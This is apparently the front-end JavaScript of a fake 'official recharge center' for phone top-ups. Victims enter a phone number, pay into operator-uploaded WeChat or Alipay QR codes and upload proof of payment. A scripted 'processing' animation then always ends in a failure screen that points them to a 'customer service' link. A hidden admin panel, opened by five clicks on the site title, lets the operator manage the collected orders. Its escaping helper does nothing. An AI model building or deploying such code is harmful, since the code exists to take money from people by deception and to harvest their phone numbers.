// 官方充值中心 · 前端逻辑（纯 JS，无框架）
// 所有写库请求都走 /api/* （Netlify Functions 持有 API key）
let currentPhone='',currentVoucherCode='',currentOrderId='',selectedAmount=0,selectedDiscount=0,currentPayment='wechat',screenshotBase64='',settings={},adminLoggedIn=false,allOrders=[],processTimers=[];

// Toast 提示
function toast(m){let t=document.getElementById('toast');if(!t){t=document.createElement('div');t.id='toast';t.className='toast';document.body.appendChild(t);}t.textContent=m;t.classList.add('show');clearTimeout(t._timer);t._timer=setTimeout(()=>t.classList.remove('show'),2000);}

// 通用请求封装
async function api(p,o={}){const r=await fetch(p,{headers:{'Content-Type':'application/json'},...o});let d={};try{d=await r.json();}catch(e){}if(!r.ok)throw new Error(d.error||('请求失败('+r.status+')'));return d;}

// 页面切换（带淡出动画）
function switchPage(id){['pageHome','pageRecharge','pagePay','pageResult','pageAdmin'].forEach(i=>{const el=document.getElementById(i);if(el)el.classList.toggle('active',i===id);});window.scrollTo(0,0);}
function goToHome(){switchPage('pageHome');}

// ========== 领券 ==========
function claimVoucher(){
 const phoneEl=document.getElementById('inputPhone'),phone=(phoneEl.value||'').trim(),errEl=document.getElementById('phoneError'),btn=document.getElementById('btnClaim'),statusEl=document.getElementById('voucherStatusArea'),nextBtn=document.getElementById('btnNext');
 if(!/^1\d{10}$/.test(phone)){errEl.classList.add('visible');phoneEl.classList.add('input-error');phoneEl.focus();return;}
 errEl.classList.remove('visible');phoneEl.classList.remove('input-error');
 btn.disabled=true;statusEl.innerHTML='<span class="status-dot"></span>正在领取代金券…';
 api('/api/voucher',{method:'POST',body:JSON.stringify({phone})}).then(d=>{
  currentPhone=phone;currentVoucherCode=d.code;
  statusEl.innerHTML='<div style="background:#f0fdf4;border:1px solid #bbf7d0;border-radius:10px;padding:12px;margin-top:8px;color:#15803d;font-size:14px">✅ 代金券已绑定<br><b style="font-family:monospace;font-size:16px;letter-spacing:1px">'+d.code+'</b></div>';
  nextBtn.disabled=false;nextBtn.style.display='block';toast('领取成功');
 }).catch(e=>{
  statusEl.textContent='❌ '+e.message;toast('领取失败');
 }).finally(()=>{btn.disabled=false;});
}

function goToRecharge(){switchPage('pageRecharge');}
function genOrderId(){return 'yj'+Date.now().toString().slice(-9)+Math.floor(Math.random()*900+100);}

// ========== 选择金额 ==========
function selectAmount(el){
 document.querySelectorAll('#amountOptions .amount-card').forEach(c=>c.classList.remove('selected'));
 el.classList.add('selected');
 selectedAmount=parseInt(el.dataset.amount,10)||0;
 selectedDiscount=parseInt(el.dataset.discount,10)||0;
 currentOrderId=genOrderId();
 const actual=selectedAmount-selectedDiscount;
 document.getElementById('opOrderId').textContent=currentOrderId;
 document.getElementById('opAmount').textContent='¥'+selectedAmount;
 document.getElementById('opVoucher').textContent=currentVoucherCode||'-';
 document.getElementById('opDiscount').textContent='¥'+selectedDiscount;
 document.getElementById('opActual').textContent='¥'+actual;
}

function switchPayment(method,el){
 currentPayment=method;
 document.querySelectorAll('.pay-tab').forEach(t=>t.classList.remove('active'));
 if(el)el.classList.add('active');
 renderQR();
}
function renderQR(){
 const box=document.getElementById('qrBox');
 if(!box)return;
 const url=currentPayment==='wechat'?settings.wechat_qr_url:settings.alipay_qr_url;
 if(url){box.innerHTML='<img src="'+url+'" alt="收款码" style="max-width:100%;max-height:100%">';}
 else{box.innerHTML='<span class="qr-placeholder">请在后台设置收款码</span>';}
}

function goToPay(){
 if(!selectedAmount){toast('请选择充值金额');return;}
 document.getElementById('payPhone').textContent=currentPhone;
 document.getElementById('payAmount').textContent='¥'+selectedAmount;
 renderQR();switchPage('pagePay');
}

// ========== 上传截图 ==========
function handleUpload(input){
 const f=input.files&&input.files[0];
 if(!f)return;
 const reader=new FileReader();
 reader.onload=function(e){
  const img=new Image();
  img.onload=function(){
   const canvas=document.createElement('canvas');
   let w=img.width,h=img.height;
   const maxDim=800;
   if(w>maxDim||h>maxDim){if(w>h){h=Math.round(h*maxDim/w);w=maxDim;}else{w=Math.round(w*maxDim/h);h=maxDim;}}
   canvas.width=w;canvas.height=h;
   const ctx=canvas.getContext('2d');
   ctx.drawImage(img,0,0,w,h);
   let quality=0.7;
   let dataUrl=canvas.toDataURL('image/jpeg',quality);
   while(dataUrl.length>60000&&quality>0.3){quality-=0.1;dataUrl=canvas.toDataURL('image/jpeg',quality);}
   screenshotBase64=dataUrl;
   const p=document.getElementById('uploadPreview');
   p.src=dataUrl;p.style.display='block';
   document.getElementById('uploadArea').classList.add('has-image');
  };
  img.src=e.target.result;
 };
 reader.readAsDataURL(f);
}

// ========== 提交订单 ==========
function submitOrder(){
 if(!screenshotBase64){toast('请上传付款截图');return;}
 const btn=document.querySelector('#pagePay .btn-primary');
 if(btn)btn.disabled=true;
 api('/api/order',{method:'POST',body:JSON.stringify({
  phone:currentPhone,voucherCode:currentVoucherCode,
  rechargeAmount:selectedAmount,voucherDiscount:selectedDiscount,
  actualPay:selectedAmount-selectedDiscount,paymentMethod:currentPayment,
  screenshotBase64:screenshotBase64,contact:''
 })}).then(d=>{startProcessing();}).catch(e=>{
  toast('提交失败：'+e.message);if(btn)btn.disabled=false;
 });
}

// ========== 充值中动画（升级版：进度条 + 步骤逐个亮起 + 无倒计时数字）==========
function startProcessing(){
 processTimers.forEach(clearTimeout);processTimers=[];
 switchPage('pageResult');
 const pv=document.getElementById('processingView');
 const fv=document.getElementById('failView');
 pv.style.display='block';fv.style.display='none';
 resetSteps();
 const bar=document.getElementById('progressBar');
 bar.style.transition='none';bar.style.width='0%';
 requestAnimationFrame(()=>{requestAnimationFrame(()=>{
  bar.style.transition='width .8s cubic-bezier(.22,1,.36,1)';
 });});
 document.getElementById('processText').textContent='订单提交成功';
 document.getElementById('processSub').textContent='正在连接充值通道…';
 bar.style.width='15%';
 stepDone(1);
 processTimers.push(setTimeout(()=>{
  document.getElementById('processText').textContent='正在处理充值…';
  document.getElementById('processSub').textContent='已连接充值通道，正在处理';
  bar.style.width='45%';
  stepActive(2);
 },1200));
 processTimers.push(setTimeout(()=>{
  document.getElementById('processText').textContent='系统确认中…';
  document.getElementById('processSub').textContent='等待系统确认到账';
  bar.style.width='75%';
  stepDone(2);
  stepActive(3);
 },2500));
 processTimers.push(setTimeout(()=>{
  bar.style.width='95%';
  stepDone(3);
 },3800));
 processTimers.push(setTimeout(()=>{
  showFail();
 },4500));
}

function resetSteps(){
 for(let i=1;i<=3;i++){
  const dot=document.getElementById('step'+i),txt=document.getElementById('stepTxt'+i);
  dot.className='step-dot';txt.className='';
 }
}
function stepDone(n){
 const dot=document.getElementById('step'+n),txt=document.getElementById('stepTxt'+n);
 dot.className='step-dot done';txt.className='step-text-done';
}
function stepActive(n){
 const dot=document.getElementById('step'+n),txt=document.getElementById('stepTxt'+n);
 dot.className='step-dot active';txt.className='step-text-active';
}

// ========== 显示失败结果 ==========
function showFail(){
 const pv=document.getElementById('processingView');
 const fv=document.getElementById('failView');
 pv.style.opacity='1';
 pv.style.transition='opacity .35s ease';
 pv.style.opacity='0';
 setTimeout(()=>{
  pv.style.display='none';
  pv.style.opacity='1';
  fv.style.display='block';
 },350);
 document.getElementById('resOrderId').textContent=currentOrderId;
 document.getElementById('resPhone').textContent=currentPhone;
 document.getElementById('resAmount').textContent='¥'+selectedAmount;
 document.getElementById('resDiscount').textContent='¥'+selectedDiscount;
 document.getElementById('resActual').textContent='¥'+(selectedAmount-selectedDiscount);
 selectedAmount=0;selectedDiscount=0;screenshotBase64='';currentOrderId='';
 const p=document.getElementById('uploadPreview');
 if(p){p.style.display='none';p.src='';}
 document.getElementById('uploadArea').classList.remove('has-image');
}

function contactService(){
 if(settings.cs_link&&settings.cs_link!=='#'){window.location.href=settings.cs_link;}
 else{toast('请先在后台设置客服链接');}
}

// ========== 设置加载与应用 ==========
async function loadSettings(){try{settings=await api('/api/settings');}catch(e){settings={};}applySettings();}
function applySettings(){
 const s=settings||{};
 if(s.site_name)document.getElementById('navSiteName').textContent=s.site_name;
 if(s.logo_url){const l=document.getElementById('navLogoPlaceholder');l.innerHTML='<img src="'+s.logo_url+'" style="width:22px;height:22px;object-fit:contain;border-radius:4px">';}
 if(s.announcement)document.getElementById('announcementText').textContent=s.announcement;
 if(s.cs_name||s.cs_link){const cs=document.getElementById('btnCs');if(cs)cs.textContent='💬 '+(s.cs_name||'联系在线客服');}
 if(document.getElementById('csNameInput'))document.getElementById('csNameInput').value=s.cs_name||'';
 if(document.getElementById('csLinkInput'))document.getElementById('csLinkInput').value=s.cs_link||'';
 if(document.getElementById('siteNameInput'))document.getElementById('siteNameInput').value=s.site_name||'';
 if(document.getElementById('announcementInput'))document.getElementById('announcementInput').value=s.announcement||'';
 if(s.logo_url&&document.getElementById('logoPreview')){const p=document.getElementById('logoPreview');p.src=s.logo_url;p.style.display='block';}
 if(s.banner_url&&document.getElementById('bannerPreview')){const p=document.getElementById('bannerPreview');p.src=s.banner_url;p.style.display='block';}
 if(s.wechat_qr_url&&document.getElementById('wechatQRPreview')){const p=document.getElementById('wechatQRPreview');p.src=s.wechat_qr_url;p.style.display='block';}
 if(s.alipay_qr_url&&document.getElementById('alipayQRPreview')){const p=document.getElementById('alipayQRPreview');p.src=s.alipay_qr_url;p.style.display='block';}
 renderQR();
}

// ========== 后台功能 ==========
function adminLogin(){
 const pwd=(document.getElementById('adminPasswordInput').value||'').trim();
 if(!pwd){toast('请输入管理密码');return;}
 api('/api/admin/login',{method:'POST',body:JSON.stringify({password:pwd})}).then(()=>{
  adminLoggedIn=true;
  document.getElementById('adminLoginArea').style.display='none';
  document.getElementById('adminContentArea').style.display='block';
  renderOrderTable();toast('登录成功');
 }).catch(e=>{toast('登录失败：'+e.message);});
}
function adminLogout(){
 adminLoggedIn=false;
 document.getElementById('adminLoginArea').style.display='block';
 document.getElementById('adminContentArea').style.display='none';
 document.getElementById('adminPasswordInput').value='';
 switchAdminTab('orders',document.querySelector('.admin-tab'));
}
function switchAdminTab(name,el){
 document.querySelectorAll('.admin-panel').forEach(p=>p.classList.remove('active'));
 document.querySelectorAll('.admin-tab').forEach(t=>t.classList.remove('active'));
 const pm={orders:'adminPanelOrders',qrcodes:'adminPanelQrcodes',service:'adminPanelService',site:'adminPanelSite'};
 const panel=document.getElementById(pm[name]);
 if(panel)panel.classList.add('active');
 if(el)el.classList.add('active');
 if(name==='orders')renderOrderTable();
}
async function renderOrderTable(){
 const body=document.getElementById('orderTableBody');
 if(!body)return;
 body.innerHTML='<tr><td colspan="7" style="text-align:center;color:#94a3b8">加载中…</td></tr>';
 try{allOrders=await api('/api/orders');}
 catch(e){body.innerHTML='<tr><td colspan="7" style="text-align:center;color:#ef4444">加载失败：'+e.message+'</td></tr>';return;}
 drawOrderRows(allOrders);
}
function drawOrderRows(list){
 const body=document.getElementById('orderTableBody');
 if(!list.length){body.innerHTML='<tr><td colspan="7" style="text-align:center;color:#94a3b8">暂无订单</td></tr>';return;}
 const st={processing:'🟡 处理中',success:'🟢 成功',failed:'🔴 失败'};
 body.innerHTML=list.map(o=>'<tr><td>'+esc(o.id)+'</td><td>'+(o.phone||'-')+'</td><td>'+(o.voucher_code||'-')+'</td><td>¥'+(o.recharge_amount||0)+'</td><td>¥'+(o.actual_pay||0)+'</td><td>'+(st[o.status]||o.status)+'</td><td><button class="btn-sm" onclick="viewPaymentScreenshot(\''+encodeURIComponent(o.payment_screenshot_url||'')+'\')">凭证</button> <button class="btn-sm" onclick="changeOrderStatus(\''+o.id+'\',\'success\')">成功</button> <button class="btn-sm" onclick="changeOrderStatus(\''+o.id+'\',\'failed\')">失败</button></td></tr>').join('');
}
function searchOrders(){
 const kw=(document.getElementById('orderSearchInput').value||'').trim().toLowerCase();
 if(!kw){drawOrderRows(allOrders);return;}
 const filtered=allOrders.filter(o=>((o.id||'').toLowerCase().includes(kw)||(o.phone||'').toLowerCase().includes(kw)));
 drawOrderRows(filtered);
}
function viewPaymentScreenshot(url){
 const d=decodeURIComponent(url||'');
 if(!d){toast('无凭证图片');return;}
 document.getElementById('modalImage').src=d;
 document.getElementById('modalOverlay').style.display='flex';
}
function closeModal(){document.getElementById('modalOverlay').style.display='none';}
function changeOrderStatus(id,status){
 api('/api/order',{method:'PATCH',body:JSON.stringify({id:id,status:status})}).then(()=>{toast('状态已更新');renderOrderTable();}).catch(e=>toast('更新失败：'+e.message));
}
function saveQRCode(type,input){
 const f=input.files&&input.files[0];if(!f)return;
 const field=type==='wechat'?'wechat_qr_url':'alipay_qr_url',statusId=type==='wechat'?'wechatQRStatus':'alipayQRStatus';
 const r=new FileReader();
 r.onload=e=>{
  api('/api/settings',{method:'POST',body:JSON.stringify({[field]:e.target.result})}).then(()=>{
   settings[field]=e.target.result;
   const p=document.getElementById(type==='wechat'?'wechatQRPreview':'alipayQRPreview');
   if(p){p.src=e.target.result;p.style.display='block';}
   document.getElementById(statusId).textContent='✅ 已保存';renderQR();toast('收款码已保存');
  }).catch(e=>{document.getElementById(statusId).textContent='❌ '+e.message;});
 };
 r.readAsDataURL(f);
}
function saveServiceSettings(){
 const csName=document.getElementById('csNameInput').value.trim(),csLink=document.getElementById('csLinkInput').value.trim();
 api('/api/settings',{method:'POST',body:JSON.stringify({cs_name:csName,cs_link:csLink})}).then(()=>{
  settings.cs_name=csName;settings.cs_link=csLink;applySettings();toast('客服设置已保存');
 }).catch(e=>toast('保存失败：'+e.message));
}
function saveSiteImage(type,input){
 const f=input.files&&input.files[0];if(!f)return;
 const field=type==='logo'?'logo_url':'banner_url';
 const r=new FileReader();
 r.onload=e=>{
  api('/api/settings',{method:'POST',body:JSON.stringify({[field]:e.target.result})}).then(()=>{
   settings[field]=e.target.result;
   const p=document.getElementById(type==='logo'?'logoPreview':'bannerPreview');
   if(p){p.src=e.target.result;p.style.display='block';}
   applySettings();toast('图片已保存');
  }).catch(e=>toast('保存失败：'+e.message));
 };
 r.readAsDataURL(f);
}
function saveSiteSettings(){
 const siteName=document.getElementById('siteNameInput').value.trim(),
       announcement=document.getElementById('announcementInput').value.trim(),
       adminPwd=document.getElementById('adminPwdInput').value,
       body={site_name:siteName,announcement:announcement};
 if(adminPwd){if(adminPwd.length<4){toast('管理密码至少4位');return;}body.admin_password=adminPwd;}
 api('/api/settings',{method:'POST',body:JSON.stringify(body)}).then(()=>{
  settings.site_name=siteName;settings.announcement=announcement;
  if(adminPwd){adminLoggedIn=true;settings.has_password=true;}
  document.getElementById('adminPwdInput').value='';applySettings();toast('网站设置已保存');
 }).catch(e=>toast('保存失败：'+e.message));
}
function esc(s){return String(s==null?'':s).replace(/&/g,'&').replace(/</g,'<').replace(/>/g,'>').replace(/"/g,'"');}

// ========== 初始化 ==========
window.addEventListener('DOMContentLoaded',()=>{
 loadSettings();
 let cc=0,ct=null,title=document.getElementById('navSiteName');
 if(title){
  title.addEventListener('click',()=>{
   cc++;clearTimeout(ct);ct=setTimeout(()=>{cc=0;},2000);
   if(cc>=5){
    cc=0;
    if(adminLoggedIn||!settings.has_password){
     document.getElementById('adminLoginArea').style.display='none';
     document.getElementById('adminContentArea').style.display='block';
     if(!settings.has_password){switchAdminTab('site',document.querySelectorAll('.admin-tab')[3]);}
     else{renderOrderTable();}
    }else{
     document.getElementById('adminLoginArea').style.display='block';
     document.getElementById('adminContentArea').style.display='none';
    }
    switchPage('pageAdmin');
   }
  });
 }
});
